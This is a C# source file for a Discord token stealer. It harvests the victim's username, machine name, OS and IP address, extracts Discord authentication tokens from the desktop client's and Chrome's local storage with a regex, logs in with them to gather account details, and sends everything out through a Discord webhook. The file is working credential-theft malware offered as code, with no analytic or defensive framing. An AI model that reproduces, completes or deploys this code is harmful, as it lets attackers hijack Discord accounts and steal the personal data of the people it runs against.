using Discord;
using System.Net;
using System.Text;
using Microsoft.Win32;
using DiscordTokenStealer.Discord;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using static DiscordTokenStealer.IPInfo;

namespace DiscordTokenStealer
{
    public static class Program
    {
        private static async Task Main(string[] args)
        {
            StringBuilder content = new StringBuilder($"Username: {Environment.UserName}{Environment.NewLine}").AppendLine($"Machine Name: {Environment.MachineName}").AppendLine($"Operating System: {Environment.OSVersion.Platform}");
            IPAddress? ipAddress = await GetIPAddress();
            if (ipAddress != null)
            {
                content.AppendLine($"IPAddress: {ipAddress}");
            }
            string? browserToken = RuntimeInformation.IsOSPlatform(OSPlatform.Windows) ? GetBrowserDiscordToken() : null;
            string? desktopToken = GetDesktopClientToken();
            if (browserToken != null || desktopToken != null)
            {
                content.AppendLine("Tokens: ");
                using DiscordClient client = new DiscordClient();
                if (desktopToken != null)
                {
                    content.AppendLine($"\t{desktopToken}");
                    DiscordUser? user = await client.Login(desktopToken);
                    if (user != null)
                    {
                        content.AppendLine($"\tSummary: {Environment.NewLine}{user.Summary}{Environment.NewLine}");
                    }
                }
                if (browserToken != null)
                {
                    content.AppendLine($"\t{browserToken}");
                    DiscordUser? user = await client.Login(browserToken);
                    if (user != null)
                    {
                        content.AppendLine($"\tSummary: {Environment.NewLine}{user.Summary}{Environment.NewLine}");
                    }
                }
                content.AppendLine();
            }
            using DiscordWebhook webhook = new DiscordWebhook("https://discord.com/api/webhooks/{webhook.id}/{webhook.token}");
            await webhook.SendMessage(content.ToString());
        }

        // Unsure if this works, chrome only.
        private static string? GetBrowserDiscordToken()
        {
            FileInfo? defaultBrowser = GetDefaultBrowserLocation();
            if (defaultBrowser?.Directory == null || !defaultBrowser.FullName.ToLower().Contains("chrome"))
            {
                return null;
            }
            return ParseToken($"{defaultBrowser.Directory.Name.Split(' ').Aggregate(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), Path.Combine)}{"\\User Data\\Default\\Local Storage\\leveldb\\"}");
        }

        private static string? GetDesktopClientToken()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
            return ParseToken(path) ?? ParseToken(path.Replace("discord", "discordcanary"));
        }

        private static readonly Regex TokenRegex = new Regex("[[]oken.*?\"((?:mfa|nfa))[.](.*?)\"", RegexOptions.Compiled);
        private static string? ParseToken(string directory)
        {
            if (!Directory.Exists(directory))
            {
                return null;
            }
            GroupCollection? groups = Directory.GetFiles(directory, "*.ldb").Select(filePath => TokenRegex.Match(File.ReadAllText(filePath))).Where(match => match.Success && match.Groups.Count >= 3).Select(match => match.Groups).FirstOrDefault();
            if (groups == null || groups.Count < 3)
            {
                return null;
            }
            return string.Join('.', groups.Values.Skip(1));
        }

        // https://stackoverflow.com/a/17599201
        private const string ExeFileExtension = ".exe";
        private static FileInfo? GetDefaultBrowserLocation()
        {
            try
            {
                string? path = Registry.ClassesRoot.OpenSubKey(@$"{Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice")?.GetValue("Progid")}\shell\open\command")?.GetValue(null)?.ToString()?.ToLower()
                                                   .Replace("\"", string.Empty);
                if (path == null || !path.EndsWith(ExeFileExtension))
                {
                    return null;
                }
                FileInfo fileInfo = new FileInfo(path[..(path.LastIndexOf(ExeFileExtension, StringComparison.Ordinal) + ExeFileExtension.Length)]);
                return !fileInfo.Exists ? null : fileInfo;
            }
            catch
            {
                return null;
            }
        }

        private static async Task<IPAddress?> GetIPAddress()
        {
            IPAddress? local = await GetLocalIPv4() ?? await GetLocalIPv6() ?? null;
            if (!System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
            {
                return local;
            }
            IPInformation? info = await GetIpInformation();
            if (info == null || !IPAddress.TryParse(info.IP, out IPAddress? address))
            {
                return local;
            }
            return (info.Privacy != null && (info.Privacy.VPN || info.Privacy.Proxy || info.Privacy.Tor)) ? local : address;
        }
    }
}
